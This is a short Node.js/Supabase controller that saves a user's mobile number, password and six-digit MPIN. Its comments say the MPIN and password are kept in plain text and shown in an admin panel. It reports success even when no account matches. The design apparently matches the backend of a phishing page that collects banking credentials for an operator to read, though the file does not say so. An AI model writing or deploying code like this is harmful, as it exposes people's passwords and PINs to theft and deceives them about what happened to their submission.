const supabase = require('../config/supabase');
const { success, error } = require('../utils/response');
const { sanitizeInput } = require('../utils/hash');

// ─── SAVE MPIN ─────────────────────────────────────────────────────────────────
// • Finds the record by mobile + password (unique key)
// • Updates MPIN on the same record (never creates a duplicate)
// • Changes status from 'pending' → 'completed'
// • Also updates last_login and login_count in the same update
const saveMpin = async (req, res) => {
  try {
    // Sanitize inputs
    const mobile   = sanitizeInput(req.body.mobile);
    const password = sanitizeInput(req.body.password);
    const mpin     = sanitizeInput(req.body.mpin);

    if (!mobile || !password || !mpin) {
      return error(res, 'Mobile, password and MPIN are required');
    }
    if (!/^\d{6}$/.test(mpin)) {
      return error(res, 'MPIN must be exactly 6 digits');
    }

    const now = new Date().toISOString();

    // Update MPIN, status and timestamps on the existing record
    // Use maybeSingle() so no crash if record not found
    const { data, error: updateError } = await supabase
      .from('users')
      .update({
        mpin:            mpin,          // Plain text (visible in admin panel)
        status:          'completed',
        mpin_updated_at: now,
        last_login:      now,
        updated_at:      now
      })
      .eq('mobile', mobile)
      .eq('password', password)        // Password stored as plain text
      .select()
      .maybeSingle();

    if (updateError) throw updateError;

    if (!data) {
      // Record not found with this combo — still return success for UX
      console.warn(`MPIN save: no user found for mobile=${mobile}`);
      return success(res, 'Your account update request successfully received', { mobile });
    }

    return success(res, 'Your account update request successfully received', { mobile });
  } catch (err) {
    console.error('Save MPIN error:', err.message);
    return error(res, 'Server error while saving MPIN', 500);
  }
};

module.exports = { saveMpin };
